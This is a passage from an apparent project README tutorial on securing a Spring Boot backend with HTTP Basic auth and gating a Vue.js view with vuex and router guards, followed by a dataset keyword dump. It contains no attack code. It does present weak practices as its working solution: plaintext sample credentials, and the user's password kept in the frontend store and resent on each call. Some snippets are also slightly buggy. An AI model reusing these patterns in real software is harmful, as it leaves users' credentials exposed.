        |                                                                       |
        +-----------------------------------------------------------------------+


#### Configure Spring Security

First we add a new REST resource `/secured` inside our `BackendController we want to secure - and use in a separate frontend later:

```
    @GetMapping(path=""/secured"")
    public @ResponseBody String getSecured() {
        LOG.info(""GET successfully called on /secured resource"");
        return SECURED_TEXT;
    }
```

With Spring it is relatively easy to secure our API. Let's add `spring-boot-starter-security` to our [pom.xml](backend/pom.xml):

```xml
		<!-- Secure backend API -->
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-security</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.security</groupId>
			<artifactId>spring-security-test</artifactId>
			<scope>test</scope>
		</dependency>
```

Also create a new @Configuration annotated class called [WebSecurityConfiguration.class](backend/src/main/java/de/jonashackt/springbootvuejs/configuration/WebSecurityConfiguration.java):

```java
package de.jonashackt.springbootvuejs.configuration;

import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.config.http.SessionCreationPolicy;

@Configuration
@EnableWebSecurity
public class WebSecurityConfiguration extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {

        http
            .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) // No session will be created or used by spring security
        .and()
            .httpBasic()
        .and()
            .authorizeRequests()
                .antMatchers(""/api/hello"").permitAll()
                .antMatchers(""/api/user/**"").permitAll() // allow every URI, that begins with '/api/user/'
                .antMatchers(""/api/secured"").authenticated()
                .anyRequest().authenticated() // protect all other requests
        .and()
            .csrf().disable(); // disable cross site request forgery, as we don't use cookies - otherwise ALL PUT, POST, DELETE will get HTTP 403!
    }

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication()
                .withUser(""foo"").password(""{noop}bar"").roles(""USER"");
    }
}

```

Using a simple `http.httpBasic()` we configure to provide a Basic Authentication for our secured resources.

To deep dive into the Matcher configurations, have a look into https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#jc-authorize-requests

#### Be aware of CSRF!

__BUT:__ Be aware of the CSRF (cross site request forgery) part! The defaults will render a [HTTP 403 FORBIDDEN for any HTTP verb that modifies state (PATCH, POST, PUT, DELETE)](https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#csrf-configure):

> by default Spring Security’s CSRF protection will produce an HTTP 403 access denied.

For now we can disable the default behavior with `http.csrf().disable()`


#### Testing the secured Backend

See https://www.baeldung.com/rest-assured-authentication

Inside our [BackendControllerTest](backend/src/test/java/de/jonashackt/springbootvuejs/controller/BackendControllerTest.java) we should check, whether our API reacts with correct HTTP 401 UNAUTHORIZED, when called without our User credentials:

```
	@Test
	public void secured_api_should_react_with_unauthorized_per_default() {

		given()
		.when()
			.get(""/api/secured"")
		.then()
			.statusCode(HttpStatus.SC_UNAUTHORIZED);
	}
```

Using `rest-assured` we can also test, if one could access the API correctly with the credentials included:

```
	@Test
	public void secured_api_should_give_http_200_when_authorized() {

		given()
			.auth().basic(""foo"", ""bar"")
		.when()
			.get(""/api/secured"")
		.then()
			.statusCode(HttpStatus.SC_OK)
			.assertThat()
				.body(is(equalTo(BackendController.SECURED_TEXT)));
	}
```

The crucial point here is to use the `given().auth().basic(""foo"", ""bar"")` configuration to inject the correct credentials properly.



#### Configure credentials inside application.properties and environment variables

Defining the users (and passwords) inside code (like our [WebSecurityConfiguration.class](backend/src/main/java/de/jonashackt/springbootvuejs/configuration/WebSecurityConfiguration.java)) that should be given access to our application is a test-only practice!

For our super simple example application, we could have a solution quite similar - but much more safe: If we would be able to extract this code into configuration and later use Spring's powerful mechanism of overriding these configuration with environment variables, we could then store them safely inside our deployment pipelines settings, that are again secured by another login - e.g. as Heroku Config Vars.

Therefore the first step would be to delete the following code:

```
@Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication()
                .withUser(""foo"").password(""{noop}bar"").roles(""USER"");
    }
```

and add the following configuration to our [application.properties](backend/src/main/resources/application.properties):

```
spring.security.user.name=sina
spring.security.user.password=miller
```

Running our tests using the old credentials should fail now. Providing the newer one, the test should go green again.

Now introducing environment variables to the game could also be done locally inside our IDE for example. First change the test `secured_api_should_give_http_200_when_authorized` again and choose some new credentials like user `maik` with pw `meyer`.

Don't change the `application.properties` right now - use your IDE's run configuration and insert two environment variables:

```
SPRING_SECURITY_USER_NAME=maik
SPRING_SECURITY_USER_PASSWORD=meyer
```

Now the test should run green again with this new values.


## Protect parts of Vue.js frontend

Now that we have secured a specific part of our backend API, let's also secure a part of our Vue.js frontend:

        +-----------------------------------------------------------------------+
        |  Vue.js frontend                                                      |
        |                                                                       |
        |   +-----------------+    +-----------------+    +-----------------+   |
        |   |                 |    |                 |    |                 |   |
        |   |                 |    |                 |    |  Protected      |   |
        |   |                 |    |                 |    |                 |   |
        |   |                 |    |                 |    |  Vue.js View    |   |
        |   |                 |    |                 |    |                 |   |
        |   +-----------------+    +-----------------+    +-----------------+   |
        |                                                                       |
        +-----------------------------------------------------------------------+

                   +---+                  +---+                  +---+
                   |   | /api/hello       |   | /api/user        |   | /api/secured
                   +---+                  +---+                  +---+
                     |                      |                      |
        +-----------------------------------------------------------------------+
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |  Spring Boot backend                                                  |
        +-----------------------------------------------------------------------+


#### Create a new Vue Login component

As there is already a secured Backend API, we also want to have a secured frontend part. 

Every solution you find on the net seems to be quite overengineered for the ""super-small-we-have-to-ship-today-app"". Why should we bother with a frontend auth store like vuex at the beginning? Why start with OAuth right up front? These could be easily added later on!

The simplest solution one could think about how to secure our frontend, would be to create a simple Login.vue component, that simply accesses the `/api/secured` resource every time the login is used.

Therefore we use [Vue.js conditionals](https://vuejs.org/v2/guide/conditional.html) to show something on our new [Login.vue](frontend/src/components/Login.vue):

```
<template>
  <div class=""protected"" v-if=""loginSuccess"">
    <h1><b-badge variant=""success"">Access to protected site granted!</b-badge></h1>
    <h5>If you're able to read this, you've successfully logged in.</h5>
  </div>
  <div class=""unprotected"" v-else-if=""loginError"">
    <h1><b-badge variant=""danger"">You don't have rights here, mate :D</b-badge></h1>
    <h5>Seams that you don't have access rights... </h5>
  </div>
  <div class=""unprotected"" v-else>
    <h1><b-badge variant=""info"">Please login to get access!</b-badge></h1>
    <h5>You're not logged in - so you don't see much here. Try to log in:</h5>

    <form @submit.prevent=""callLogin()"">
      <input type=""text"" placeholder=""username"" v-model=""user"">
      <input type=""password"" placeholder=""password"" v-model=""password"">
      <b-btn variant=""success"" type=""submit"">Login</b-btn>
      <p v-if=""error"" class=""error"">Bad login information</p>
    </form>
  </div>

</template>

<script>
import api from './backend-api'

export default {
  name: 'login',

  data () {
    return {
      loginSuccess: false,
      loginError: false,
      user: '',
      password: '',
      error: false
    }
  }
}

</script>
``` 

For now the conditional is only handled by two boolean values: `loginSuccess` and `loginError`.

To bring those to life, we implement the `callLogin()` method:

```
,
  methods: {
    callLogin() {
      api.getSecured(this.user, this.password).then(response => {
        console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status)
        if(response.status == 200) {
          this.loginSuccess = true
        }
      }).catch(error => {
        console.log(""Error: "" + error)
        this.loginError = true
      })
    }
  }
```

With this simple implementation, the Login component asks the Spring Boot backend, if a user is allowed to access the `/api/secured` resource. The [backend-api.js](frontend/src/components/backend-api.js) provides an method, which uses axios' Basic Auth feature:

```
    getSecured(user, password) {
        return AXIOS.get(`/secured/`,{
            auth: {
                username: user,
                password: password
            }});
    }
``` 

Now the Login component works for the first time:

![secure-spring-vue-simple-login](screenshots/secure-spring-vue-simple-login.gif)




#### Protect multiple Vue.js components

Now we have a working Login component. Now let's create a new `Protected.vue` component, since we want to have something that's only accessible, if somebody has logged in correctly:

```
<template>
  <div class=""protected"" v-if=""loginSuccess"">
    <h1><b-badge variant=""success"">Access to protected site granted!</b-badge></h1>
    <h5>If you're able to read this, you've successfully logged in.</h5>
  </div>
  <div class=""unprotected"" v-else>
    <h1><b-badge variant=""info"">Please login to get access!</b-badge></h1>
    <h5>You're not logged in - so you don't see much here. Try to log in:</h5>
    <router-link :to=""{ name: 'Login' }"" exact target=""_blank"">Login</router-link>
  </div>

</template>

<script>
import api from './backend-api'

export default {
  name: 'protected',

  data () {
    return {
      loginSuccess: false,
      error: false
    }
  },
  methods: {
    //
  }
}

</script>
```

This component should only be visible, if the appropriate access was granted at the Login. Therefore we need to solve 2 problems:

* __Store the login state__
* __Redirect user from Protected.vue to Login.vue, if not authenticated before__



#### Store login information with vuex

The super dooper simple solution would be to simply use `LocalStorage`. But with [vuex](https://github.com/vuejs/vuex) there is a centralized state management in Vue.js, which is pretty popular. So we should invest some time to get familiar with it. There's a full guide available: https://vuex.vuejs.org/guide/ and a great introductory blog post here: https://pusher.com/tutorials/authentication-vue-vuex

You could also initialize a new Vue.js project with Vue CLI and mark the `vuex` checkbox. But we try to extend the current project here.

First we add [the vuex dependency](https://www.npmjs.com/package/vuex) into our [package.json](frontend/package.json):

```
...
    ""vue"": ""^2.6.10"",
    ""vue-router"": ""^3.0.6"",
    ""vuex"": ""^3.1.1""
  },
```

> There are four things that go into a Vuex module: the initial [state](https://vuex.vuejs.org/guide/state.html), [getters](https://vuex.vuejs.org/guide/getters.html), [mutations](https://vuex.vuejs.org/guide/mutations.html) and [actions](https://vuex.vuejs.org/guide/actions.html)

#### Define the vuex state

To implement them, we create a new [store.js](frontend/src/store.js) file:

```
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

export default new Vuex.Store({
    state: {
        loginSuccess: false,
        loginError: false,
        userName: null
    },
  mutations: {

  },
  actions: {

  },
  getters: {
  
  }
})

``` 

We only have an initial state here, which is that a login could be successful or not - and there should be a `userName`.


#### Define a vuex action login() and the mutations login_success & login_error

Then we have a look onto __vuex actions: They provide a way to commit mutations to the vuex store.__ 

As our app here is super simple, we only have one action to implement here: `login`. We omit the `logout` and `register` actions, because we only define one admin user in the Spring Boot backend right now and don't need an implemented logout right now. Both could be implemented later!

We just shift our logic on how to login a user from the `Login.vue` to our vuex action method:

```
    mutations: {
        login_success(state, name){
            state.loginSuccess = true
            state.userName = name

        },
        login_error(state){
            state.loginError = true
            state.userName = name
        }
    },
    actions: {
        async login({commit}, user, password) {
            api.getSecured(user, password)
                .then(response => {
                    console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status);
                    if(response.status == 200) {
                        // place the loginSuccess state into our vuex store
                        return commit('login_success', name);
                    }
                }).catch(error => {
                    console.log(""Error: "" + error);
                    // place the loginError state into our vuex store
                    commit('login_error', name);
                    return Promise.reject(""Invald credentials!"")
                })
        }
    },
```

Instead of directly setting a boolean to a variable, we `commit` a mutation to our store if the authentication request was successful or unsuccessful. We therefore implement two simple mutations: `login_success` & `login_error`


#### Last but not least: define getters for the vuex state

To be able to access vuex state from within other components, we need to implement getters inside our vuex store. As we only want some simple info, we need the following getters:

```
    getters: {
        isLoggedIn: state => state.loginSuccess,
        hasLoginErrored: state => state.loginError
    }
```

#### Use vuex Store inside the Login component and forward to Protected.vue, if Login succeeded

Instead of directly calling the auth endpoint via axios inside our Login component, we now want to use our vuex store and its actions instead. Therefore we don't even need to import the [store.js](frontend/src/store.js) inside our `Login.vue`, we can simply access it through `$store`. Thy is that? Because we already did that inside our [main.js](frontend/src/main.js):

```
import store from './store'

...

new Vue({
    router,
    store,
    render: h => h(App)
}).$mount('#app')
```

With that configuration `store` and `router` are accessible from within every Vue component with the `$` prefixed :) 

If we have a look into our `Login.vue` we see that in action:

```
callLogin() {
      this.$store.dispatch('login', { user: this.user, password: this.password})
        .then(() => this.$router.push('/Protected'))
        .catch(error => {
          this.error.push(error)
        })
    }
```

Here we access our vuex store action `login` and issue a login request to our Spring Boot backend. If this succeeds, we use the Vue `$router` to forward the user to our `Protected.vue` component.


#### Redirect user from Protected.vue to Login.vue, if not authenticated before

Now let's enhance our [router.js](frontend/src/router.js) slightly. We use the Vue.js routers' [meta field](https://router.vuejs.org/guide/advanced/meta.html) feature to check, whether a user is loggin in already and therefore should be able to access our Protected component with the URI `/protected` :

```
    {
        path: '/protected',
        component: Protected,
        meta: { 
            requiresAuth: true 
        }
    },
``` 

We also add a new behavior to our router, that checks if it requires authentication every time a route is accessed. If so, it will redirect to our Login component:

```
router.beforeEach((to, from, next) => {
    if (to.matched.some(record => record.meta.requiresAuth)) {
        // this route requires auth, check if logged in
        // if not, redirect to login page.
        if (!store.getters.isLoggedIn) {
            next({
                path: '/login'
            })
        } else {
            next();
        }
    } else {
        next(); // make sure to always call next()!
    }
});
```

Now if one clicks onto `Protected` and didn't login prior, our application redirects to `Login` automatically:

![secure-spring-redirect-to-login](screenshots/secure-spring-redirect-to-login.gif)

With this redirect, we also don't need the part with `<div class=""protected"" v-if=""loginSuccess"">` inside our Login.vue, since in case of a successful login, the user is directly redirected to the Protected.vue.


## Check auth state at secured backend endpoints

We're now already where we wanted to be at the first place: Our Spring Boot backend has a secured API endpoint, which works with simple user/password authentication. And our Vue.js frontend uses this endpoint to do a Login and protect the `Protected` component, if the user didn't log in before. The login state is held in the frontend, using the `vuex` store.

Now if we want to go a step ahead and call a secured API endpoint in the backend from within our `Protected` frontend component, we need to fully store the credentials inside our `vuex` store, so we could access our secured resource


        +-----------------------------------------------------------------------+
        |  Vue.js frontend                                                      |
        |                          +----------------------------------------+   |
        |                          |                vuex store              |   |
        |                          +----------------------------------------+   |
        |                                   |                      |            |
        |   +-----------------+    +-----------------+    +-----------------+   |
        |   |                 |    |                 |    |                 |   |
        |   |                 |    |    Login.vue    |    |    Protected    |   |
        |   |                 |    |                 |    |                 |   |
        |   +-----------------+    +-----------------+    +-----------------+   |
        |                                           |               |           |
        +-------------------------------------------|---------------|-----------+
                                                    |-------------| |  
                   +---+                  +---+                  +---+
                   |   | /api/hello       |   | /api/user        |   | /api/secured
                   +---+                  +---+                  +---+
                     |                      |                      |
        +-----------------------------------------------------------------------+
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |  Spring Boot backend                                                  |
        +-----------------------------------------------------------------------+

Therefore we enhance our [store.js](frontend/src/store.js):

```
export default new Vuex.Store({
    state: {
        loginSuccess: false,
        loginError: false,
        userName: null,
        userPass: null,
        response: []
    },
    mutations: {
        login_success(state, payload){
            state.loginSuccess = true;
            state.userName = payload.userName;
            state.userPass = payload.userPass;
        },
    ...
    },
    actions: {
        login({commit}, {user, password}) {
            ...
                            // place the loginSuccess state into our vuex store
                            commit('login_success', {
                                userName: user,
                                userPass: password
                            });
            ...
    getters: {
        isLoggedIn: state => state.loginSuccess,
        hasLoginErrored: state => state.loginError,
        getUserName: state => state.userName,
        getUserPass: state => state.userPass
    }
```

> Be sure to use the current way to define and [interact with vuex mutations](https://vuex.vuejs.org/guide/mutations.html). Lot's of blog posts are using an old way of committing multiple parameters like `commit('auth_success', token, user)`. This DOES NOT work anymore. Only the first parameter will be set, the others are lost! 

Now inside our [Protected.vue](frontend/src/components/Protected.vue), we can use the stored credentials to access our `/secured` endpoint:

```
<script>
  import api from './backend-api'
  import store from './../store'

export default {
  name: 'protected',

  data () {
    return {
      backendResponse: '',
      securedApiCallSuccess: false,
      errors: null
    }
  },
  methods: {
    getSecuredTextFromBackend() {
      api.getSecured(store.getters.getUserName, store.getters.getUserPass)
              .then(response => {
                console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status);
                this.securedApiCallSuccess = true;
                this.backendResponse = response.data;
              })
              .catch(error => {
                console.log(""Error: "" + error);
                this.errors = error;
              })
    }
  }
}
```

Feel free to create a nice GUI based on `securedApiCallSuccess`, `backendResponse` and `errors` :)



# Links

Nice introductory video: https://www.youtube.com/watch?v=z6hQqgvGI4Y

Examples: https://vuejs.org/v2/examples/

Easy to use web-based Editor: https://vuejs.org/v2/examples/
",0,1,2,mit,16.0,"['javamagazin', 'softwerker', 'reader', 'consider', 'switching', 'live', 'deployment', 'available', 'heroku', 'http', 'project', 'used', 'example', 'variety', 'article', 'ebook', 'javamagazin', 'shortcut', 'softwerker', 'upgrade', 'procedure', 'get', 'newest', 'node', 'npm', 'update', 'update', 'vue', 'see', 'http', 'search', 'new', 'web', 'year', 'absence', 'well', 'frontend', 'developer', 'like', 'playing', 'around', 'spring', 'boot', 'microservices', 'docker', 'automating', 'thing', 'ansible', 'docker', 'scaling', 'thing', 'spring', 'cloud', 'docker', 'compose', 'traefik', 'gui', 'building', 'new', 'js', 'framework', 'town', 'every', 'two', 'year', 'last', 'one', 'angular', 'felt', 'good', 'choice', 'loved', 'coding', 'experience', 'day', 'training', 'felt', 'able', 'write', 'awesome', 'frontends', 'year', 'later', 'heard', 'afar', 'complete', 'rewrite', 'angular', 'new', 'kid', 'town', 'facebook', 'react', 'lot', 'stuff', 'dependency', 'manager', 'like', 'bower', 'co', 'new', 'trying', 'cope', 'glad', 'found', 'article', 'http', 'key', 'point', 'angular', 'way', 'go', 'know', 'version', 'complete', 'typescript', 'loss', 'many', 'advantage', 'angular', 'coming', 'react', 'facebookish', 'problem', 'licence', 'need', 'choose', 'btw', 'redux', 'mobx', 'harder', 'learning', 'curve', 'slower', 'coding', 'speed', 'introduction', 'phrase', 'sound', 'really', 'great', 'vue', 'pronounced', 'like', 'view', 'progressive', 'framework', 'building', 'user', 'interface', 'unlike', 'monolithic', 'framework', 'vue', 'designed', 'ground', 'incrementally', 'adoptable', 'core', 'library', 'focused', 'view', 'layer', 'easy', 'pick', 'integrate', 'library', 'existing', 'project', 'hand', 'vue', 'also', 'perfectly', 'capable', 'powering', 'sophisticated', 'application', 'used', 'combination', 'modern', 'tooling', 'supporting', 'library', 'think', 'could', 'good', 'idea', 'invest', 'day', 'let', 'look', 'setup', 'spring', 'boot', 'prerequisite', 'macosx', 'linux', 'window', 'project', 'setup', 'backend', 'go', 'http', 'initialize', 'spring', 'boot', 'app', 'place', 'zip', 'content', 'backend', 'folder', 'customize', 'pom', 'copy', 'content', 'frontend', 'serving', 'later', 'embedded', 'tomcat', 'frontend', 'creating', 'project', 'done', 'slightly', 'changed', 'use', 'parent', 'project', 'already', 'git', 'repository', 'otherwise', 'vue', 'cli', 'would', 'initialize', 'new', 'one', 'see', 'http', 'initialize', 'project', 'skeleton', 'directory', 'therefore', 'asks', 'question', 'cli', 'choose', 'default', 'preset', 'need', 'plugins', 'project', 'choose', 'plugins', 'space', 'bar', 'also', 'use', 'new', 'configure', 'project', 'want', 'learn', 'installing', 'head', 'doc', 'http', 'use', 'handle', 'npm', 'node', 'bower', 'grunt', 'gulp', 'webpack', 'backend', 'dev', 'like', 'maven', 'plugin', 'http', 'great', 'help', 'know', 'maven', 'everything', 'need', 'add', 'plugin', 'frontend', 'tell', 'webpack', 'output', 'content', 'commonly', 'node', 'project', 'create', 'directory', 'build', 'contains', 'minified', 'source', 'code', 'web', 'app', 'want', 'therefore', 'need', 'create', 'optional', 'configure', 'correctly', 'first', 'app', 'run', 'inside', 'root', 'directory', 'run', 'complete', 'spring', 'boot', 'app', 'go', 'http', 'look', 'first', 'spring', 'boot', 'app', 'faster', 'feedback', 'update', 'build', 'every', 'change', 'part', 'javascript', 'thing', 'needed', 'get', 'fast', 'feedback', 'cd', 'run', 'browser', 'developer', 'tool', 'extension', 'install', 'browser', 'extension', 'http', 'get', 'better', 'feedback', 'chrome', 'intellij', 'integration', 'blog', 'post', 'http', 'especially', 'look', 'quite', 'cool', 'http', 'call', 'spring', 'boot', 'rest', 'backend', 'prior', 'vue', 'build', 'solution', 'party', 'library', 'necessary', 'one', 'axios', 'also', 'see', 'blog', 'post', 'http', 'calling', 'rest', 'service', 'axios', 'simple', 'go', 'script', 'area', 'component', 'add', 'template', 'area', 'request', 'service', 'call', 'via', 'calling', 'method', 'access', 'data', 'problem', 'sop', 'policy', 'sop', 'could', 'problem', 'want', 'develop', 'app', 'run', 'http', 'spring', 'boot', 'rest', 'backend', 'http', 'need', 'use', 'resource', 'sharing', 'protocol', 'cors', 'handle', 'read', 'background', 'info', 'cors', 'http', 'enabling', 'axios', 'cors', 'support', 'create', 'central', 'axios', 'configuration', 'file', 'called', 'allow', 'request', 'base', 'url', 'spring', 'boot', 'app', 'port', 'accessible', 'could', 'use', 'configuration', 'inside', 'component', 'enabling', 'spring', 'boot', 'cors', 'support', 'additionally', 'need', 'configure', 'spring', 'boot', 'backend', 'answer', 'appropriate', 'cors', 'http', 'header', 'response', 'good', 'tutorial', 'http', 'therefore', 'add', 'annotation', 'backendcontroller', 'backend', 'respond', 'accept', 'request', 'enables', 'cors', 'one', 'method', 'repeatedly', 'add', 'annotation', 'rest', 'endpoint', 'nice', 'style', 'use', 'global', 'solution', 'allow', 'access', 'cors', 'enabled', 'rest', 'resource', 'could', 'done', 'call', 'resource', 'behind', 'return', 'correct', 'cors', 'header', 'stop', 'webpack', 'vue', 'something', 'much', 'smarter', 'u', 'help', 'u', 'sop', 'thanks', 'colleague', 'daniel', 'pointed', 'nice', 'proxying', 'feature', 'webpack', 'need', 'configure', 'complex', 'cors', 'stuff', 'anymore', 'according', 'vue', 'cli', 'doc', 'thing', 'need', 'configure', 'webpack', 'devserver', 'request', 'could', 'done', 'easily', 'optional', 'inside', 'configuration', 'place', 'webpack', 'us', 'really', 'handy', 'component', 'proxy', 'http', 'http', 'incl', 'changing', 'origin', 'accordingly', 'used', 'webpack', 'build', 'process', 'configure', 'proxymiddleware', 'need', 'change', 'something', 'using', 'history', 'mode', 'nicer', 'url', 'use', 'default', 'configuration', 'generated', 'template', 'see', 'url', 'inside', 'like', 'usage', 'history', 'mode', 'achieve', 'much', 'nicer', 'url', 'without', 'thing', 'frontend', 'configure', 'router', 'accordingly', 'inside', 'nearly', 'everything', 'nearly', 'one', 'click', 'link', 'inside', 'frontend', 'user', 'correctly', 'send', 'wished', 'component', 'user', 'enters', 'url', 'directly', 'browser', 'get', 'spring', 'boot', 'backend', 'give', 'u', 'http', 'since', 'url', 'present', 'backend', 'solution', 'redirect', 'better', 'forward', 'user', 'frontend', 'router', 'doc', 'provide', 'example', 'configuration', 'spring', 'boot', 'luckily', 'resource', 'essence', 'implement', 'forwarding', 'controller', 'backendcontroller', 'controller', 'forward', 'every', 'request', 'frontend', 'bootstrap', 'nice', 'integration', 'bootstrap', 'http', 'use', 'pretty', 'bootstrap', 'stuff', 'ease', 'like', 'instead', 'doc', 'contain', 'possible', 'component', 'http', 'see', 'element', 'go', 'http', 'look', 'like', 'good', 'discussion', 'various', 'ui', 'component', 'framework', 'http', 'heroku', 'deployment', 'may', 'already', 'read', 'app', 'automatically', 'deployed', 'heroku', 'http', 'project', 'make', 'use', 'nice', 'heroku', 'pipeline', 'feature', 'get', 'full', 'continuous', 'delivery', 'pipeline', 'nearly', 'effort', 'help', 'super', 'cool', 'github', 'action', 'build', 'app', 'every', 'push', 'master', 'checkbox', 'set', 'app', 'get', 'also', 'automatically', 'deployed', 'heroku', 'github', 'action', 'codegov', 'build', 'succeeded', 'connect', 'heroku', 'app', 'github', 'activate', 'automatic', 'deploys', 'set', 'named', 'checkbox', 'everything', 'accessing', 'spring', 'boot', 'rest', 'backend', 'heroku', 'frontend', 'frontend', 'need', 'know', 'port', 'spring', 'boot', 'backend', 'api', 'automatically', 'set', 'heroku', 'every', 'time', 'start', 'app', 'try', 'heroku', 'app', 'locally', 'create', 'environment', 'variable', 'run', 'access', 'heroku', 'set', 'port', 'need', 'use', 'relative', 'path', 'inside', 'application', 'instead', 'host', 'port', 'need', 'configure', 'axios', 'way', 'inside', 'using', 'heroku', 'postgres', 'database', 'spring', 'boot', 'backend', 'frontend', 'first', 'add', 'heroku', 'postgres', 'database', 'heroku', 'app', 'follow', 'instruction', 'stackoverflow', 'configure', 'needed', 'environment', 'variable', 'heroku', 'http', 'mind', 'addition', 'backend', 'described', 'http', 'able', 'use', 'spring', 'data', 'magic', 'need', 'interface', 'like', 'write', 'testcases', 'accordingly', 'like', 'include', 'functionality', 'see', 'use', 'frontend', 'see', 'testing', 'install', 'http', 'jest', 'jest', 'new', 'shooting', 'star', 'sky', 'javascript', 'testing', 'framework', 'http', 'http', 'example', 'http', 'jest', 'doc', 'http', 'jest', 'unittest', 'look', 'like', 'pas', 'component', 'prop', 'using', 'router', 'see', 'http', 'test', 'component', 'http', 'test', 'file', 'could', 'named', 'could', 'reside', 'nearly', 'everywhere', 'project', 'jest', 'configuration', 'jest', 'done', 'inside', 'jest', 'configured', 'via', 'project', 'root', 'field', 'case', 'especially', 'need', 'configure', 'jest', 'need', 'know', 'right', 'output', 'directory', 'show', 'correct', 'output', 'run', 'corresponding', 'maven', 'build', 'run', 'jest', 'unit', 'test', 'recognize', 'table', 'test', 'covered', 'file', 'integration', 'maven', 'build', 'via', 'inside', 'always', 'automatically', 'run', 'jest', 'unittests', 'following', 'configuration', 'integrate', 'jest', 'unittests', 'right', 'npm', 'run', 'build', 'command', 'used', 'project', 'mind', 'depiction', 'known', 'bug', 'http', 'run', 'jest', 'test', 'inside', 'intellij', 'first', 'need', 'install', 'nodejs', 'intellij', 'plugin', 'http', 'bundled', 'intellij', 'default', 'intellij', 'jest', 'integration', 'doc', 'http', 'automatic', 'search', 'inside', 'jest', 'configuration', 'file', 'seem', 'work', 'right', 'manually', 'configure', 'part', 'inside', 'run', 'configuration', 'running', 'look', 'like', 'already', 'used', 'unittest', 'test', 'nightwatch', 'great', 'tooling', 'http', 'nightwatch', 'control', 'webdriver', 'selenium', 'standalone', 'server', 'child', 'process', 'abstract', 'providing', 'handy', 'dsl', 'acceptance', 'test', 'doc', 'http', 'nightwatch', 'configured', 'watch', 'breaking', 'change', 'http', 'option', 'could', 'found', 'doc', 'http', 'write', 'nightwatch', 'test', 'example', 'nightwatch', 'test', 'provided', 'run', 'test', 'run', 'test', 'npm', 'security', 'npm', 'security', 'npm', 'http', 'http', 'run', 'update', 'vulnerable', 'package', 'situation', 'nothing', 'else', 'help', 'try', 'also', 'install', 'braking', 'change', 'http', 'update', 'npm', 'regularly', 'http', 'update', 'package', 'regularly', 'http', 'shift', 'template', 'architecture', 'vue', 'cli', 'long', 'run', 'template', 'like', 'main', 'webpack', 'deprecated', 'universe', 'http', 'plugins', 'bring', 'following', 'benefit', 'compared', 'template', 'lock', 'plugins', 'added', 'point', 'development', 'lifecycle', 'zero', 'config', 'plugins', 'allow', 'spend', 'time', 'developing', 'rather', 'configuring', 'easy', 'upgrade', 'configuration', 'customized', 'without', 'ejecting', 'allows', 'developer', 'make', 'plugins', 'presets', 'starting', 'point', 'http', 'omg', 'small', 'vue', 'cli', 'plugins', 'http', 'vue', 'cli', 'us', 'architecture', 'inspect', 'newly', 'created', 'project', 'find', 'dependency', 'start', 'plugins', 'modify', 'internal', 'webpack', 'configuration', 'inject', 'command', 'feature', 'listed', 'project', 'creation', 'process', 'implemented', 'plugins', 'plugings', 'extension', 'existing', 'project', 'could', 'also', 'made', 'via', 'want', 'add', 'nightwatch', 'test', 'project', 'run', 'scoped', 'package', 'available', 'http', 'new', 'vue', 'cli', 'plugin', 'architecture', 'clean', 'big', 'really', 'neat', 'compact', 'thing', 'old', 'big', 'dependency', 'block', 'see', 'maintaining', 'library', 'choice', 'like', 'nightwatch', 'jest', 'also', 'maintaining', 'library', 'use', 'vue', 'cli', 'look', 'super', 'clean', 'dependency', 'block', 'dig', 'directory', 'like', 'find', 'used', 'library', 'nightwatch', 'configured', 'respective', 'really', 'cool', 'admit', 'file', 'vue', 'cli', 'remove', 'need', 'explicit', 'configuration', 'file', 'thus', 'wont', 'find', 'directory', 'project', 'root', 'implement', 'convention', 'configuration', 'approach', 'make', 'much', 'easier', 'project', 'provides', 'widly', 'used', 'default', 'webpack', 'etc', 'also', 'eas', 'upgradeability', 'project', 'even', 'make', 'possible', 'configure', 'webpack', 'etc', 'cors', 'handling', 'build', 'directory', 'could', 'done', 'optional', 'updating', 'vue', 'existing', 'project', 'update', 'local', 'latest', 'version', 'update', 'js', 'dependency', 'upgrade', 'next', 'let', 'move', 'next', 'aware', 'latest', 'version', 'vue', 'currently', 'considered', 'resource', 'http', 'quickstart', 'http', 'using', 'even', 'migrate', 'http', 'upgrade', 'migration', 'tooling', 'simply', 'use', 'took', 'around', 'minute', 'macbook', 'changed', 'file', 'got', 'new', 'upgraded', 'deps', 'john', 'stated', 'post', 'strange', 'find', 'version', 'order', 'see', 'fresh', 'skeleton', 'would', 'produce', 'let', 'also', 'create', 'one', 'another', 'dir', 'assume', 'installed', 'aligned', 'project', 'match', 'latest', 'skeleton', 'generation', 'much', 'better', 'router', 'store', 'api', 'got', 'directory', 'view', 'correct', 'folder', 'extracted', 'one', 'component', 'use', 'newly', 'introduced', 'view', 'component', 'also', 'went', 'upgraded', 'latest', 'release', 'version', 'instead', 'alpha', 'except', 'atm', 'import', 'refactored', 'coming', 'style', 'everything', 'read', 'also', 'check', 'using', 'path', 'redirect', 'like', 'lead', 'non', 'working', 'routing', 'configuration', 'error', 'browser', 'console', 'state', 'changed', 'new', 'param', 'regex', 'syntax', 'like', 'crucial', 'point', 'get', 'jest', 'work', 'add', 'following', 'otherwise', 'test', 'ran', 'following', 'error', 'luckily', 'answer', 'helped', 'http', 'finally', 'bootstrap', 'vue', 'support', 'vue', 'right', 'http', 'temporarily', 'commented', 'import', 'add', 'typescript', 'vue', 'build', 'typescript', 'http', 'static', 'type', 'system', 'help', 'prevent', 'many', 'potential', 'runtime', 'error', 'application', 'grow', 'vue', 'written', 'typescript', 'mean', 